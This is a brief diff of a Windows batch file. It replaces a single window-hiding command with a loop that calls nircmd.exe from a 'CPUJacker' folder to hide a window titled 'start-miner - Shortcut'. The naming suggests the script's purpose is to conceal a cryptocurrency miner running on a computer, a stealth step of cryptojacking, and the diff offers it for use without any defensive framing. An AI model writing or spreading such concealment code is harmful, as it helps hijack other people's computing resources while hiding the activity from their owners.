@@ -1,2 +1,4 @@
-timeout /t 10 >nul
-nircmd win hide title "Script1"
+@echo off                                                                     
+for /L %%a in (1,1,10) do (
+C:\CPUJacker\nircmd.exe win hide title "start-miner - Shortcut"          
+)
